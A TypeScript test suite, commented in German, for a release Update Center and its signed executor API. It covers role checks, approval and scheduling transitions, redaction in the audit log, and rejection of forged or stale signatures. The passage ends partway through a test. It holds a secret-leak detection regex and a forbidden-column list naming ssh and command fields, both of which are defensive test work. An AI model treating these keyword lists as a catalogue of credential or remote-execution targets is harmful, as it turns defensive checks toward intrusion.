import { after, before, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { BASE_URL, call, data, get, post, put, requireServer } from '../helpers/client';
import { ACCOUNTS, loginAll, type AccountName } from '../helpers/accounts';
import { PAKET_VERSION, PRUEF_BUILD_ID, pruefBeilage, pruefManifest } from '../helpers/pruefartefakt';
import { eigeneOrganisationId, testDb, testDbGrund, testDbSchliessen } from '../helpers/testdb';
import { PRUEF_AUSFUEHRER_SCHLUESSEL, PRUEF_AUSFUEHRER_TOKEN, PRUEF_IDENTITAET_COMMIT, PRUEF_SICHERHEITSBERICHT_TOKEN } from '../helpers/webhooks';
import { SIGNATUR_KOPF, ZEIT_KOPF, signieren } from '../../src/lib/release/ausfuehrer-signatur';
import type { ArtefaktBeilage } from '../../src/lib/release/manifest';
import { releaseErgebnisSchema, releaseManifestSchema, releaseUebernahmeSchema } from '../../src/lib/validation/system';
import {
  aktivierungDeuten,
  artefaktMessen,
  AUSGANG_KEIN_ERFOLG,
  ausgabeZeile,
  AusfuehrerFehler,
  ciLaufWaehlen,
  planen,
  type Auftrag,
  type Lage,
} from '../../scripts/release-ausfuehrer';
import { mitBeilageZusammenfuehren } from '../../scripts/release-registrieren';

/**
 * Update Center der Systemverantwortung (Produktsprint 2026-09-26).
 *
 * Geprüft wird, was eine Entscheidung ausmacht — wer sie treffen darf,
 * welche Übergänge es gibt, welche nicht, dass jede im Prüfprotokoll steht
 * und dass keine etwas *ausführt*. Die Versionen legt die Prüfung direkt in
 * der Testdatenbank an: Einen Endpunkt, der Versionen annimmt, gibt es
 * absichtlich nicht (`scripts/release-registrieren.ts`).
 *
 * **Aufbau seit 2026-09-30.** Die Vorbereitung (Server, Anmeldungen,
 * Prüfversionen) hing bis dahin als Haken an der Wurzel der Datei und lief
 * damit für jeden Fall — auch für die reinen Fälle des Werkzeugs am Ende,
 * die keinen Server brauchen und mit `--test-name-pattern` einzeln laufen
 * sollen. Jetzt ruft jeder Block, der den Server braucht, dieselbe einmalige
 * Vorbereitung (`vorbereiten`) auf und räumt nach sich auf.
 */

const RUN = Date.now();
const NEU = `9.${RUN % 1_000_000}.0`;
const ALT = `0.0.${RUN % 1_000_000}`;
/** Versionen für den Block „Release-Ausführer". */
const AUSF = `9.${RUN % 1_000_000}.1`;
const AUSF_ROT = `9.${RUN % 1_000_000}.2`;
const AUSF_WERKZEUG = `9.${RUN % 1_000_000}.3`;
const AUSF_ZWEI = `9.${RUN % 1_000_000}.4`;
const AUSF_RUECK = `9.${RUN % 1_000_000}.5`;
const AUSF_VERWAIST = `9.${RUN % 1_000_000}.6`;
const AUSF_JUNG = `9.${RUN % 1_000_000}.7`;
const AUSF_STAGING = `9.${RUN % 1_000_000}.8`;
/** Eine gültig geformte Schweizer IBAN im Freitext — sie darf nicht ins Protokoll. */
const IBAN_IM_GRUND = 'CH93 0076 2011 6238 5295 7';
const db = testDb();
let jars: Record<AccountName, string>;
let neuId = '';
let altId = '';

type Uebersicht = {
  data: { laufend: string; belegt: boolean; identitaet: string; releases: { release: { id: string; version: string }; zustand: string }[] };
};
const zustandVon = async (id: string) =>
  data(await get<Uebersicht>('/api/system/releases', { jar: jars.super })).releases.find((r) => r.release.id === id)?.zustand;

/** Für neue Fälle: ohne Testdatenbank scheitern statt überspringen (Null-Überspringen-Tor). */
function pflichtDb() {
  assert.ok(db, `kein Zugang zur Testdatenbank: ${testDbGrund()}`);
  return db;
}

/**
 * Ein frisches Verzeichnis unter TEMP für ein Artefakt, dessen Pfad der
 * Ausführer weitergeben soll.
 *
 * Seit 2026-10-01 gibt der Ausführer keinen Archivpfad mit Leerzeichen
 * weiter (`PFAD_MUSTER` in `scripts/release-ausfuehrer.ts`). Läge TEMP selbst
 * unter einem solchen Pfad, scheiterte jeder gelungene Fall unten mit „hat
 * nicht die erwartete Form", und niemand sähe sofort, warum. Unter Windows
 * ist TEMP üblicherweise der 8.3-Kurzname (`C:\Users\JAVADQ~1\…`), im CI
 * `/tmp` — beides ohne Leerzeichen.
 */
function artefaktVerzeichnis(praefix: string): string {
  assert.doesNotMatch(
    tmpdir(),
    /\s/,
    `TEMP (${tmpdir()}) enthält ein Leerzeichen — der Ausführer gibt solche Pfade absichtlich nicht weiter. TEMP für die Prüfreihe auf einen Pfad ohne Leerzeichen setzen.`,
  );
  return mkdtempSync(join(tmpdir(), praefix));
}

async function aufraeumen() {
  if (!db) return;
  // Auch Reste abgebrochener Läufe (andere RUN-Nummer): Ein liegengebliebener,
  // fälliger Prüfauftrag würde sonst vom Werkzeug im nächsten Lauf abgeholt,
  // ein liegengebliebener DEPLOYING sperrte die Umgebung für jede Übernahme.
  const releases = await db.release.findMany({
    where: {
      OR: [
        { version: { in: [NEU, ALT, AUSF, AUSF_ROT, AUSF_WERKZEUG, AUSF_ZWEI, AUSF_RUECK, AUSF_VERWAIST, AUSF_JUNG, AUSF_STAGING] } },
        { summary: { startsWith: 'Prüfversion' } },
      ],
    },
    select: { id: true },
  });
  const ids = releases.map((r) => r.id);
  await db.releaseDeferral.deleteMany({ where: { releaseId: { in: ids } } });
  await db.releaseRequest.deleteMany({ where: { releaseId: { in: ids } } });
  await db.release.deleteMany({ where: { id: { in: ids } } });
}

let vorbereitet: Promise<void> | null = null;
/** Einmal je Lauf: Server da, Anmeldungen, Prüfversionen des Update Centers. */
function vorbereiten(): Promise<void> {
  vorbereitet ??= (async () => {
    await requireServer();
    jars = await loginAll();
    if (!db) return;
    await aufraeumen();
    const basis = {
      releasedAt: new Date(),
      summary: 'Prüfversion der Testreihe — Mehrfachleistungen, Update Center.',
      features: ['Buchungen mit mehreren Leistungen'],
      fixes: ['Verfügbarkeit berücksichtigt die Einsatzzeiten'],
      securityFixes: ['Sitzungsprüfung verschärft'],
      migrations: ['20260926100000_versionsverwaltung'],
      ciStatus: 'PASSED' as const,
      expectedDowntimeMinutes: 5,
      artifactSizeBytes: 48_000_000,
    };
    neuId = (await db.release.create({ data: { ...basis, version: NEU, kind: 'SECURITY', securitySeverity: 'HIGH' } })).id;
    altId = (await db.release.create({ data: { ...basis, version: ALT, kind: 'PATCH', securityFixes: [] } })).id;
  })();
  return vorbereitet;
}

after(async () => {
  await testDbSchliessen();
});

describe('Update Center', { concurrency: 1 }, () => {
  before(vorbereiten);
  after(aufraeumen);
  it('nur die Systemverantwortung — Seite und Endpunkte', async () => {
    assert.equal((await get('/api/system/releases', { jar: jars.super })).status, 200);
    for (const rolle of ['admin', 'manager', 'employee', 'customer'] as const) {
      assert.equal((await get('/api/system/releases', { jar: jars[rolle] })).status, 403, rolle);
    }
    assert.equal((await get('/api/system/releases')).status, 401);
    assert.equal((await get('/admin/updates', { jar: jars.super })).status, 200);
    const admin = await get('/admin/updates', { jar: jars.admin });
    assert.ok([307, 404].includes(admin.status), `Administration: HTTP ${admin.status}`);
  });

  /**
   * Die Identität der Instanz in Übersicht und Sicherheitszentrale
   * (2026-09-30). Bis dahin nannte die Sicherheitszentrale `APP_VERSION` —
   * eine Variable, die jeder beim Start setzen kann —, und die Übersicht des
   * Update Centers kannte nur eine Versionsnummer, die ebenso gut belegt wie
   * bloss aus `package.json` eingebaut sein konnte; beide sahen gleich aus.
   * Der Testserver belegt seinen Stand über das Prüfmanifest
   * (`scripts/test-server.ts`), also müssen hier „belegt" und der
   * Prüfcommit stehen. Gegen den alten Stand scheitert der Fall an den
   * fehlenden Feldern `belegt`/`identitaet` und am fehlenden `data-identitaet`.
   */
  it('Übersicht und Sicherheitszentrale nennen die belegte Identität der Instanz, nicht APP_VERSION', async () => {
    const uebersicht = data(await get<Uebersicht>('/api/system/releases', { jar: jars.super }));
    assert.equal(uebersicht.belegt, true, 'der Testserver belegt seinen Stand nicht — läuft er mit scripts/test-server.ts?');
    assert.equal(uebersicht.identitaet, 'belegt');
    assert.equal(uebersicht.laufend, PAKET_VERSION);

    const seite = await get('/admin/sicherheit', { jar: jars.super });
    assert.equal(seite.status, 200);
    // React trennt „v" und die Nummer mit `<!-- -->` — vor dem Suchen entfernen.
    const html = seite.text.replace(/<!-- -->/g, '');
    assert.ok(html.includes('data-identitaet="belegt"'), 'die Sicherheitszentrale zeigt den Stand der Identität nicht');
    assert.ok(html.includes(PRUEF_IDENTITAET_COMMIT.slice(0, 12)), 'die Sicherheitszentrale nennt den belegten Commit nicht');
    assert.ok(html.includes(`v${PAKET_VERSION}`), 'die Sicherheitszentrale nennt die belegte Version nicht');
  });

  it('die Administration kann nicht entscheiden', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    assert.equal((await post(`/api/system/releases/${neuId}/freigabe`, undefined, { jar: jars.admin })).status, 403);
    assert.equal((await put(`/api/system/releases/${neuId}/termin`, { scheduledFor: new Date(Date.now() + 86_400_000).toISOString() }, { jar: jars.admin })).status, 403);
    assert.equal(await zustandVon(neuId), 'AVAILABLE');
  });

  it('das Dashboard meldet die neue Version der Systemverantwortung, sonst niemandem', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    // React trennt benachbarte Textknoten im Server-HTML mit `<!-- -->`
    // („v" und die Nummer sind zwei Knoten) — vor dem Suchen entfernen.
    const html = (await get('/admin', { jar: jars.super })).text.replace(/<!-- -->/g, '');
    assert.ok(html.includes('Eine neue Clenaris-Version ist verfügbar'), 'Hinweis fehlt');
    assert.ok(html.includes(`v${NEU}`), 'Versionsnummer fehlt');
    const admin = await get('/admin', { jar: jars.admin });
    assert.ok(!admin.text.includes('Clenaris-Version'), 'die Administration sieht die Versionskarte');
  });

  it('die Detailansicht nennt Typ, Schwere, Sicherheitskorrekturen und Migrationen', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const seite = await get(`/admin/updates/${neuId}`, { jar: jars.super });
    assert.equal(seite.status, 200);
    for (const text of ['Sicherheitsupdate', 'Hoch', 'Sitzungsprüfung verschärft', '20260926100000_versionsverwaltung', 'ca. 5 Minuten']) {
      assert.ok(seite.text.includes(text), `fehlt: ${text}`);
    }
  });

  it('Sicherheitsupdates: Sicherheitsversion zum Entscheiden, Abhängigkeitsbefunde nur zur Einsicht', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const advisory = `GHSA-pruef-${RUN % 100000}`;
    const bericht = await fetch(`${BASE_URL}/api/cron/security-report`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${PRUEF_SICHERHEITSBERICHT_TOKEN}` },
      body: JSON.stringify({
        quelle: 'SECURITY_CHECK',
        status: 'WARNUNG',
        erstelltAm: new Date().toISOString(),
        zusammenfassung: `Prüfreihe-${RUN}: Update Center`,
        befunde: [{ id: advisory, titel: 'pruefpaket (high): Prüflücke', schwere: 'hoch', details: 'Behebung: pruefpaket@2.0.0 (Hauptversion)' }],
      }),
    });
    assert.equal(bericht.status, 201, await bericht.text());
    try {
      const html = (await get('/admin/updates', { jar: jars.super })).text.replace(/<!-- -->/g, '');
      // Der Abschnitt reicht bis zur Überschrift der Versionsliste.
      const start = html.indexOf('data-sicherheitsupdates');
      assert.ok(start > 0, 'Abschnitt Sicherheitsupdates fehlt');
      const ende = html.indexOf('>Versionen<', start);
      const abschnitt = html.slice(start, ende > start ? ende : start + 8000);
      assert.ok(abschnitt.includes(`v${NEU}`), 'Sicherheitsversion fehlt');
      assert.ok(abschnitt.includes('prüfen, freigeben oder terminieren'));
      assert.ok(abschnitt.includes(`href="/admin/updates/${neuId}"`), 'kein Weg zur Entscheidung');
      assert.ok(abschnitt.includes(advisory) && abschnitt.includes('Prüflücke'), 'Abhängigkeitsbefund fehlt');
      // Einsicht, keine Handlung: im Abschnitt weder Formular noch Knopf —
      // entschieden wird auf der Detailseite.
      assert.ok(!/<form|<button/.test(abschnitt), 'Handlungselement im Abschnitt Sicherheitsupdates');
    } finally {
      await db!.securityReport.deleteMany({ where: { summary: `Prüfreihe-${RUN}: Update Center` } });
    }
  });

  it('freigeben → terminieren → verschieben → stornieren, und wieder freigeben', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const frei = await post<{ data: { status: string; fromVersion: string; toVersion: string } }>(`/api/system/releases/${neuId}/freigabe`, undefined, { jar: jars.super });
    assert.equal(frei.status, 200, frei.text);
    assert.equal(data(frei).status, 'APPROVED');
    assert.equal(data(frei).toVersion, NEU);
    assert.equal(await zustandVon(neuId), 'APPROVED');

    const morgen = new Date(Date.now() + 86_400_000).toISOString();
    const termin = await put<{ data: { status: string } }>(`/api/system/releases/${neuId}/termin`, { scheduledFor: morgen }, { jar: jars.super });
    assert.equal(termin.status, 200, termin.text);
    assert.equal(data(termin).status, 'SCHEDULED');

    const uebermorgen = new Date(Date.now() + 2 * 86_400_000).toISOString();
    assert.equal((await put(`/api/system/releases/${neuId}/termin`, { scheduledFor: uebermorgen }, { jar: jars.super })).status, 200);

    // Der Grund ist Freitext; die IBAN darin prüft unten, dass auch dieser Weg
    // ins Protokoll geschwärzt wird (bis 2026-09-27 ging er daran vorbei).
    const storno = await post<{ data: { status: string } }>(`/api/system/releases/${neuId}/termin/stornieren`, { grund: `Ferienzeit, Rückfragen an ${IBAN_IM_GRUND}` }, { jar: jars.super });
    assert.equal(storno.status, 200, storno.text);
    assert.equal(data(storno).status, 'CANCELLED');
    assert.equal(await zustandVon(neuId), 'AVAILABLE');

    // Nach dem Storno lässt sich die Version wieder freigeben — der stornierte
    // Auftrag bleibt als Nachweis, der partielle Index zählt nur offene.
    assert.equal((await post(`/api/system/releases/${neuId}/freigabe`, undefined, { jar: jars.super })).status, 200);
    const auftraege = await db!.releaseRequest.findMany({ where: { releaseId: neuId } });
    assert.deepEqual(auftraege.map((a) => a.status).sort(), ['APPROVED', 'CANCELLED']);
  });

  it('unzulässige Übergänge: 422', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    // Schon freigegeben (aus dem Fall davor).
    assert.equal((await post(`/api/system/releases/${neuId}/freigabe`, undefined, { jar: jars.super })).status, 422);
    // Stornieren ohne Termin.
    assert.equal((await post(`/api/system/releases/${neuId}/termin/stornieren`, {}, { jar: jars.super })).status, 422);
    // Zurückstellen, obwohl freigegeben.
    assert.equal((await post(`/api/system/releases/${neuId}/zurueckstellen`, {}, { jar: jars.super })).status, 422);
    // Termin in der Vergangenheit.
    assert.equal((await put(`/api/system/releases/${neuId}/termin`, { scheduledFor: new Date(Date.now() - 60_000).toISOString() }, { jar: jars.super })).status, 422);
    // Eine ältere Version: keine Rückstufung über das Dashboard.
    assert.equal((await post(`/api/system/releases/${altId}/freigabe`, undefined, { jar: jars.super })).status, 422);
    assert.equal(await zustandVon(altId), 'OLDER');
    // Unbekannte Felder im Körper werden abgewiesen, nicht verworfen.
    assert.equal((await post(`/api/system/releases/${neuId}/termin/stornieren`, { ziel: '2.29.18.45' }, { jar: jars.super })).status, 422);
  });

  it('gleichzeitige Freigaben: genau eine gilt', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    await db!.releaseRequest.deleteMany({ where: { releaseId: neuId } });
    const [a, b] = await Promise.all([
      post(`/api/system/releases/${neuId}/freigabe`, undefined, { jar: jars.super }),
      post(`/api/system/releases/${neuId}/freigabe`, undefined, { jar: jars.super }),
    ]);
    const status = [a.status, b.status].sort();
    assert.equal(status[0], 200, `${a.text} | ${b.text}`);
    assert.ok([409, 422].includes(status[1]!), `zweite Freigabe: HTTP ${status[1]}`);
    assert.equal(await db!.releaseRequest.count({ where: { releaseId: neuId, status: { in: ['APPROVED', 'SCHEDULED'] } } }), 1);
  });

  it('„Nicht jetzt" stellt eine verfügbare Version zurück', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    await db!.releaseRequest.deleteMany({ where: { releaseId: neuId } });
    const r = await post(`/api/system/releases/${neuId}/zurueckstellen`, { tage: 3 }, { jar: jars.super });
    assert.equal(r.status, 200, r.text);
    const dashboard = await get('/admin', { jar: jars.super });
    assert.ok(dashboard.text.includes('Zurückgestellt bis'), 'das Dashboard drängt die zurückgestellte Version weiter vor');
  });

  it('jede Entscheidung steht im Prüfprotokoll — mit Person, Versionen und ohne Geheimnisse', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const person = await db!.user.findUnique({ where: { email: ACCOUNTS.super.email }, select: { id: true } });
    const eintraege = await db!.auditLog.findMany({
      where: { entity: { in: ['ReleaseRequest', 'ReleaseDeferral'] }, summary: { contains: NEU } },
      orderBy: { createdAt: 'asc' },
    });
    const texte = eintraege.map((e) => e.summary ?? '');
    for (const muster of [/freigegeben/, /terminiert/, /verschoben/, /storniert: Ferienzeit/, /zurückgestellt/]) {
      assert.ok(texte.some((s) => muster.test(s)), `kein Eintrag für ${muster}`);
    }
    for (const e of eintraege) {
      assert.equal(e.userId, person?.id);
      const changes = e.changes as Record<string, unknown>;
      assert.equal(changes.zielVersion, NEU);
      assert.ok(typeof changes.vonVersion === 'string');
      assert.ok(!JSON.stringify(changes).match(/token|secret|passw|ssh|key/i), 'Geheimnis im Protokoll');
    }
    // Die Freigaben schrieben ihren Eintrag direkt mit `tx.auditLog.create` —
    // an der Schwärzung vorbei. Die IBAN aus dem Stornogrund darf nirgends im
    // Protokoll stehen, weder in der Zusammenfassung noch in den Änderungen.
    const alles = JSON.stringify(eintraege.map((e) => [e.summary, e.changes]));
    assert.ok(!alles.includes(IBAN_IM_GRUND) && !alles.includes('CH9300762011623852957'), 'IBAN im Klartext im Prüfprotokoll');
    assert.ok(texte.some((s) => s.includes('[IBAN redigiert]')), 'der Stornogrund fehlt oder wurde nicht geschwärzt');
    const verschoben = eintraege.find((e) => /verschoben/.test(e.summary ?? ''));
    const termin = (verschoben?.changes as { termin?: { from: string | null; to: string } }).termin;
    assert.ok(termin?.from && termin.to && termin.from !== termin.to, 'alter und neuer Termin fehlen');
  });

  /**
   * Bis 2026-09-27 hiess dieser Fall „kein Zustand behauptet eine Ausführung"
   * und verlangte genau drei Auftragszustände — richtig, solange es keinen
   * Ausführer gab. Seither gibt es ihn (Block unten), und die Zustände
   * DEPLOYING bis ROLLED_BACK haben einen Weg. Was bleibt und hier geprüft
   * wird: Die Anwendung selbst führt nichts aus — kein Auftrag trägt ein Ziel
   * oder einen Befehl, und kein Endpunkt der Oberfläche führt in einen
   * Ausführungszustand.
   */
  it('die Anwendung führt nichts aus: kein Ziel, kein Befehl, Ausführungszustände nur über den Ausführer', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const spalten = await db!.$queryRaw<{ column_name: string }[]>`
      SELECT column_name FROM information_schema.columns WHERE table_name = 'release_requests'`;
    const namen = spalten.map((s) => s.column_name.toLowerCase());
    for (const verboten of ['host', 'target', 'ziel', 'command', 'script', 'ssh']) {
      assert.ok(!namen.some((n) => n.includes(verboten)), `Spalte mit ${verboten}`);
    }
    const werte = await db!.$queryRaw<{ v: string }[]>`SELECT unnest(enum_range(NULL::"ReleaseRequestStatus"))::text AS v`;
    assert.deepEqual(werte.map((w) => w.v).sort(), ['APPROVED', 'CANCELLED', 'DEPLOYING', 'FAILED', 'ROLLED_BACK', 'SCHEDULED', 'SUCCEEDED']);
    // Kein Endpunkt nimmt eine Versionsbeschreibung an.
    assert.ok([404, 405].includes((await call('POST', '/api/system/releases', { jar: jars.super, body: { version: '99.0.0' } })).status));
  });
});

// ===========================================================================
//  Release-Ausführer (2026-09-27, gehärtet 2026-09-30)
// ===========================================================================

/**
 * Die Schnittstelle, über die ein vertrauenswürdiger Ausführer ausserhalb der
 * Anwendung fällige Aufträge abholt, übernimmt und das Ergebnis meldet —
 * geprüft mit echten Signaturen gegen den Testserver (Umgebung `test`).
 *
 * Seit 2026-09-30 belegt der Testserver seine Identität über das
 * Prüfmanifest (`scripts/test-server.ts`): Commit `PRUEF_IDENTITAET_COMMIT`,
 * Version aus `package.json`, echte `BUILD_ID`. Die Fälle unten nutzen das
 * in beide Richtungen — ein Release mit genau diesem Commit gilt als von der
 * Instanz belegt, eines mit anderem Commit nicht. Gegen den Stand davor
 * scheitern sie: Die Übernahme verlangte weder Commit noch Zielversion,
 * „erfolgreich" glaubte der gemeldeten `laufendeVersion`, `inAusfuehrung`
 * gab es nicht, und ein Auftrag ohne Rückmeldung blieb für immer DEPLOYING.
 *
 * **Warum vier Titel mit ihrer alten Fassung beginnen.** `security/testmatrix.json`
 * zitiert die Titel von vor 2026-09-30 als Belege, und
 * `scripts/testmatrix-pruefen.ts` sucht sie wörtlich in dieser Datei. Die
 * Härtung erweiterte diese Fälle, nahm ihnen aber keine Zusicherung weg —
 * also steht die alte Fassung unverändert vorn und das Neue hinter dem
 * Gedankenstrich. Ein ganz neuer Titel hätte die Belegkette still zerrissen:
 * Die Matrix sagte weiter „abgedeckt", und der Beleg wäre nicht mehr
 * auffindbar.
 */
describe('Release-Ausführer', { concurrency: 1 }, () => {
  const SUMME = createHash('sha256').update(`artefakt-${RUN}`).digest('hex');
  const COMMIT = createHash('sha1').update(`commit-${RUN}`).digest('hex');
  const COMMIT_ZWEI = createHash('sha1').update(`commit-zwei-${RUN}`).digest('hex');
  const COMMIT_RUECK = createHash('sha1').update(`commit-rueck-${RUN}`).digest('hex');
  const COMMIT_VERWAIST = createHash('sha1').update(`commit-verwaist-${RUN}`).digest('hex');
  const COMMIT_JUNG = createHash('sha1').update(`commit-jung-${RUN}`).digest('hex');
  const COMMIT_STAGING = createHash('sha1').update(`commit-staging-${RUN}`).digest('hex');
  const SCHLUESSEL_EINS = `lauf-${RUN}-eins`;
  const CI_NACHWEIS = `https://github.com/beispiel/clenaris/actions/runs/${RUN}`;
  const ERGEBNIS = '/api/cron/release-auftraege/ergebnis';
  const UEBERNEHMEN = '/api/cron/release-auftraege/uebernehmen';
  let org = '';
  let superId = '';
  let auftragId = '';
  let rotAuftragId = '';

  async function ausfuehrer(
    methode: 'GET' | 'POST',
    pfad: string,
    rumpf?: unknown,
    o: { token?: string | null; schluessel?: string; zeit?: number; signaturPfad?: string } = {},
  ) {
    const text = rumpf === undefined ? '' : JSON.stringify(rumpf);
    const zeit = o.zeit ?? Math.floor(Date.now() / 1000);
    const headers: Record<string, string> = {
      [ZEIT_KOPF]: String(zeit),
      [SIGNATUR_KOPF]: signieren(o.schluessel ?? PRUEF_AUSFUEHRER_SCHLUESSEL, { methode, pfad: o.signaturPfad ?? pfad, zeit, rumpf: text }),
    };
    if (o.token !== null) headers.authorization = `Bearer ${o.token ?? PRUEF_AUSFUEHRER_TOKEN}`;
    if (rumpf !== undefined) headers['content-type'] = 'application/json';
    const r = await fetch(`${BASE_URL}${pfad}`, { method: methode, headers, body: rumpf === undefined ? undefined : text });
    const inhalt = await r.text();
    let daten: Record<string, unknown> | null = null;
    try {
      daten = (JSON.parse(inhalt) as { data?: Record<string, unknown> }).data ?? null;
    } catch {
      /* kein JSON */
    }
    return { status: r.status, text: inhalt, daten };
  }

  const uebernahme = (ueber: Record<string, unknown> = {}) => ({
    auftragId,
    umgebung: 'test',
    ausfuehrer: 'pruefreihe/test',
    ausfuehrungsSchluessel: SCHLUESSEL_EINS,
    artefaktSha256: SUMME,
    commit: COMMIT,
    zielVersion: AUSF,
    ciNachweis: CI_NACHWEIS,
    ...ueber,
  });

  /**
   * Eine Prüfversion samt Auftrag direkt in der Datenbank — für Zustände, die
   * über die Schnittstelle erst nach Stunden (verwaist) oder gar nicht
   * entstünden (eine Übernahme einer Version, die nicht neuer ist als die
   * laufende, weist die Anwendung zu Recht ab).
   */
  async function versionMitAuftrag(o: {
    version: string;
    commit: string;
    status: 'SCHEDULED' | 'DEPLOYING';
    fromVersion?: string;
    schluessel?: string;
    claimedAt?: Date;
    /** Umgebung einer Übernahme; Vorgabe `test`, die des Testservers. */
    umgebung?: string;
  }) {
    const d = pflichtDb();
    const release = await d.release.create({
      data: {
        version: o.version,
        releasedAt: new Date(),
        kind: 'PATCH',
        summary: 'Prüfversion für den Release-Ausführer.',
        ciStatus: 'PASSED',
        commit: o.commit,
        artifactSha256: SUMME,
        artifactSizeBytes: 1024,
      },
    });
    const auftrag = await d.releaseRequest.create({
      data: {
        organizationId: org,
        releaseId: release.id,
        status: o.status,
        fromVersion: o.fromVersion ?? PAKET_VERSION,
        toVersion: o.version,
        scheduledFor: new Date(Date.now() - 60_000),
        approvedById: superId,
        approvedAt: new Date(),
        scheduledById: superId,
        scheduledAt: new Date(),
        ...(o.status === 'DEPLOYING'
          ? {
              executorId: 'pruefreihe/test',
              executionKey: o.schluessel,
              environment: o.umgebung ?? 'test',
              verifiedSha256: SUMME,
              ciEvidence: CI_NACHWEIS,
              claimedAt: o.claimedAt ?? new Date(),
            }
          : {}),
      },
    });
    return { release, auftrag };
  }

  async function entfernen(...eintraege: { release: { id: string }; auftrag: { id: string } }[]) {
    const d = pflichtDb();
    for (const e of eintraege) {
      await d.releaseRequest.deleteMany({ where: { id: e.auftrag.id } });
      await d.release.deleteMany({ where: { id: e.release.id } });
    }
  }

  const letzterEintrag = (id: string) =>
    pflichtDb().auditLog.findFirst({ where: { entity: 'ReleaseRequest', entityId: id }, orderBy: { createdAt: 'desc' } });

  before(async () => {
    await vorbereiten();
    if (!db) return;
    org = (await eigeneOrganisationId())!;
    superId = (await db.user.findUniqueOrThrow({ where: { email: ACCOUNTS.super.email }, select: { id: true } })).id;
    const basis = {
      releasedAt: new Date(),
      summary: 'Prüfversion für den Release-Ausführer.',
      migrations: [],
      expectedDowntimeMinutes: 2,
      commit: COMMIT,
      artifactSha256: SUMME,
      artifactSizeBytes: 1024,
    };
    const gruen = await db.release.create({ data: { ...basis, version: AUSF, kind: 'MINOR', ciStatus: 'PASSED' } });
    const rot = await db.release.create({ data: { ...basis, version: AUSF_ROT, kind: 'MINOR', ciStatus: 'FAILED' } });
    // Terminiert und fällig — über die Oberfläche geht das nur 15 Minuten
    // voraus; die Prüfung legt den Zustand direkt an, wie er nach Ablauf wäre.
    // Ausgangsversion ist die, die der Testserver belegt (package.json).
    const faellig = { organizationId: org, status: 'SCHEDULED' as const, fromVersion: PAKET_VERSION, scheduledFor: new Date(Date.now() - 60_000), approvedById: superId, approvedAt: new Date(), scheduledById: superId, scheduledAt: new Date() };
    auftragId = (await db.releaseRequest.create({ data: { ...faellig, releaseId: gruen.id, toVersion: AUSF } })).id;
    rotAuftragId = (await db.releaseRequest.create({ data: { ...faellig, releaseId: rot.id, toVersion: AUSF_ROT } })).id;
  });

  after(aufraeumen);

  it('ohne Token, ohne gültige Signatur, mit alter Zeit oder anderem Pfad: 401 — nichts übernommen', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const pfad = UEBERNEHMEN;
    assert.equal((await ausfuehrer('POST', pfad, uebernahme(), { token: null })).status, 401, 'ohne Token');
    assert.equal((await ausfuehrer('POST', pfad, uebernahme(), { token: 'falsch' })).status, 401, 'falsches Token');
    assert.equal((await ausfuehrer('POST', pfad, uebernahme(), { schluessel: 'falscher-schluessel' })).status, 401, 'falscher Schlüssel');
    assert.equal((await ausfuehrer('POST', pfad, uebernahme(), { zeit: Math.floor(Date.now() / 1000) - 600 })).status, 401, 'zehn Minuten alt');
    assert.equal(
      (await ausfuehrer('POST', pfad, uebernahme(), { signaturPfad: ERGEBNIS })).status,
      401,
      'Signatur für einen anderen Pfad',
    );
    // Das Cron-Geheimnis öffnet diese Tür nicht.
    assert.equal((await ausfuehrer('GET', '/api/cron/release-auftraege?umgebung=test', undefined, { token: process.env.CRON_SECRET ?? 'cron' })).status, 401);
    assert.equal((await db.releaseRequest.findUniqueOrThrow({ where: { id: auftragId } })).status, 'SCHEDULED');
  });

  it('fällige Aufträge: nur die eigene Umgebung, mit Rücksprung und Hindernis — dazu die belegte Identität der Instanz', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    assert.equal((await ausfuehrer('GET', '/api/cron/release-auftraege?umgebung=production')).status, 422, 'fremde Umgebung');
    const r = await ausfuehrer('GET', '/api/cron/release-auftraege?umgebung=test');
    assert.equal(r.status, 200, r.text);
    const liste = (r.daten!.auftraege as { auftragId: string; commit: string; artefaktSha256: string; hindernis: string | null; ruecksprung: { aufVersion: string } }[]);
    const gruen = liste.find((a) => a.auftragId === auftragId);
    const rot = liste.find((a) => a.auftragId === rotAuftragId);
    assert.ok(gruen && rot, 'fällige Aufträge fehlen');
    assert.equal(gruen.hindernis, null);
    assert.equal(gruen.commit, COMMIT);
    assert.equal(gruen.artefaktSha256, SUMME);
    assert.equal(gruen.ruecksprung.aufVersion, PAKET_VERSION);
    assert.match(rot.hindernis ?? '', /Prüfstufe/);
    // Die Identität kommt aus dem Prüfmanifest und der echten BUILD_ID —
    // nicht aus einer Variablen, und nicht als blosse Versionsnummer.
    const laufend = r.daten!.laufend as { version: string; commit: string | null; buildId: string | null; belegt: boolean };
    assert.equal(laufend.belegt, true, 'der Testserver belegt seinen Stand nicht — läuft er mit scripts/test-server.ts?');
    assert.equal(laufend.commit, PRUEF_IDENTITAET_COMMIT);
    assert.equal(laufend.version, PAKET_VERSION);
    assert.ok(typeof laufend.buildId === 'string' && laufend.buildId.length > 0);
    assert.ok(Array.isArray(r.daten!.inAusfuehrung));
  });

  it('Übernahme: falsche Summe, CI rot, fremde Umgebung → 422; richtig → 200; Wiederholung → 200; zweiter Ausführer → 409 — ebenso fremder Commit und andere Version → 422, anderes Artefakt unter demselben Schlüssel → 409', async (t) => {
    if (!db) return t.skip('keine Testdatenbank');
    const pfad = UEBERNEHMEN;
    assert.equal((await ausfuehrer('POST', pfad, uebernahme({ artefaktSha256: 'f'.repeat(64) }))).status, 422, 'falsche Summe');
    // Commit und Zielversion sind, was der Ausführer in der Beilage gelesen
